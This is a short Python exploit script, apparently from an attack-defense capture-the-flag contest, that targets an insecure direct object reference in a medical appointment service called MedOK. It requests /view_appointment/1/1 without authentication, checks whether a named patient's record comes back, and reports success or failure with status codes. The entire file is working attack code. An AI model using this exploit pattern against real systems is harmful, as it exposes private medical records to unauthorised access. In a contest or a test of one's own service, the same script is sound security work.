# Sploit (IDOR) for MedOK
# Author: boomgarang

import aiohttp
import asyncio
from colorama import Fore, Style

async def sploit_idor(HOST, PORT):
    url = f'http://{HOST}:{PORT}/view_appointment/1/1'

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                if response.status == 200:
                    text = await response.text()
                    if "Иванов Иван Иванович" in text:
                        print(Fore.GREEN + f"[+] Sploit 1 (Medok): {HOST}:{PORT} - IDOR Exploit Success" + Style.RESET_ALL)
                        return 101, None
                print(Fore.RED + f"[-] Sploit 1 (Medok): {HOST}:{PORT} - IDOR Exploit Fail" + Style.RESET_ALL)
                return 102, None
    except Exception as e:
        print(Fore.RED + f"[-] Sploit 1 (Medok): {HOST}:{PORT} - Error checking IDOR Expoloit: {e}" + Style.RESET_ALL)
        return 102, None

async def pwn(HOST):
    VERDICT = await sploit_idor(HOST, 5000)
    print(VERDICT)
    return VERDICT
